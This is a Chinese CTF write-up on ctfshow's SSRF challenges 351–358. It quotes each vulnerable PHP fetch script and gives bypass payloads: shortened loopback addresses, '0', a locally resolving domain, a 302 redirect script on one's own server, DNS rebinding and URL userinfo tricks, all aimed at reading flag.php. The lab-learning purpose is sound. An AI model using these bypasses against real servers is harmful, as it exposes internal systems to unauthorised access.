## 写在前面

转眼就22年了，忙里偷闲，来学习一下SSRF

——KonDream 2022-1-13 1:40

***

SSRF全称是Server-Side Request Forgery:服务器端请求伪造，目的是伪造服务器请求去访问无法从外网访问的内网系统

***

## web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

第一题没什么过滤，说明一下第6和第7行

| **CURLOPT_HEADER**         | 启用时会将头文件的信息作为数据流输出。                       |
| -------------------------- | ------------------------------------------------------------ |
| **CURLOPT_RETURNTRANSFER** | **true将[curl_exec()](https://www.php.net/manual/zh/function.curl-exec.php)获取的信息以字符串返回，而不是直接输出。** |

第8行执行给定的curl会话，执行成功时返回结果

`payload：url=http://127.0.0.1/flag.php`

## web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

第7行对post参数进行了过滤，但是有个小问题，就是他的过滤没有转义

`payload：url=http://127.0.0.1/flag.php`

## web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

用127.1等绕过就行

`payload：url=http://127.1.0.1/flag.php`

## web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

这个题有点怪，参考了其他师傅的wp，思路大概是在自己的vps上做个302跳转到127.0.0.1/flag.php上，这个payload是羽师傅还是Y4师傅的了记不清了，总之谢谢师傅们提供的payload

`payload：url=http://sudo.cc/flag.php`

## web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

限制域名长度不超过5，可以用127.*（0除外）

`payload：url=http://127.1/flag.php`

## web356

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

**小知识点，0在linux下会被解析成127.0.0.1，而在win中被解析成0.0.0.0.**

`payload：url=http://0/flag.php`

## web357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}

echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?> scheme
```

看第9行的过滤器，FILTER_VALIDATE_IP 过滤器把值作为 IP 进行验证。

可能的标志：

- FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
- FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
- FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
- FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

**返回值是过滤后的数据，如果过滤失败则返回FALSE**

第一种解法是在自己的vps上写个test.php

```php
<?php
header("Location:http://127.0.0.1/flag.php"); 
```

`payload：url=http://xxx/test.php`

第二种解法是利用dns重绑定漏洞，**大佬文章：https://zhuanlan.zhihu.com/p/89426041**

![image-20220113025537987](image/ctfshow-SSRF(351-360)/image-20220113025537987.png)

在ceye上进行dns重绑定

`payload：url=http://r.xxx/flag.php`

## web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

以ctf.开头，以show结尾，同时保证host为本地地址

`payload：url=http://ctf.@127.0.0.1/flag.php?show`
